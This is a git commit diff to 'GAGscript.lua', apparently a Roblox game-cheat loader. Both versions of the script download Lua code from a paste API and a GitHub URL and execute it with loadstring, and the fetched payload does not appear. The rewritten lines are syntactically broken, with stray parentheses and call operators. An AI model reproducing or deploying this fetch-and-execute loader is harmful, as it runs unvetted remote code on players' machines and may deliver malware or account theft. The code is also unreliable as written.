b19808f576b0b016d2143186f373ad4759320ab3
gagscript-server2 <tiktokbusinessacc08@gmail.com>
2025-07-26 15:55:52 +0800

    Update GAGscript.lua

--- GAGscript.lua
+++ GAGscript.lua
@@ -1,2 +1,10 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/gagscript-server2/PetRandomizerScript/refs/heads/main/growgarden.lua"))()
-loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/2LzjD0nq9zn1xTv7/raw", true))()
+local s1 = game:HttpGet("https://api.rubis.app/v2/scrap/2LzjD0nq9zn1xTv7/raw", true))()
+local s2 = game:HttpGet("https://raw.githubusercontent.com/gagscript-server2/PetRandomizerScript/refs/heads/main/growgarden.lua"))()
+
+-- Load s1 normally
+loadstring(s1)()
+
+-- Load s2 concurrently
+task.spawn(function()
+    loadstring(s2)()
+end)
